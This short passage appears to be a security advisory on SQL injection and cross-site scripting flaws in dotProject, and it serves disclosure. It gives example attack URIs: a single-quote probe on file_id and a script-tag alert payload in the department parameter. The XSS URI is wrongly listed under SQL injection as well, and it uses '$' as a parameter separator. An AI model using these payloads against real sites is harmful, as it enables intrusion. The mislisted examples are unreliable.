An attacker can exploit these issues through a browser. To exploit a cross-site scripting issue, the attacker must entice an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

SQL injection:

http://www.example.com/www/cmsadmins/dotpro/dotproject/fileviewer.php?file_id='
http://www.example.com/www/cmsadmins/dotpro/dotproject/index.php?m=projects$department=company_1"&gt;&lt;script&gt;alert(1)&lt;/script&gt;


Cross-site scripting:

http://www.example.com/www/cmsadmins/dotpro/dotproject/index.php?m=projects$department=company_1"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
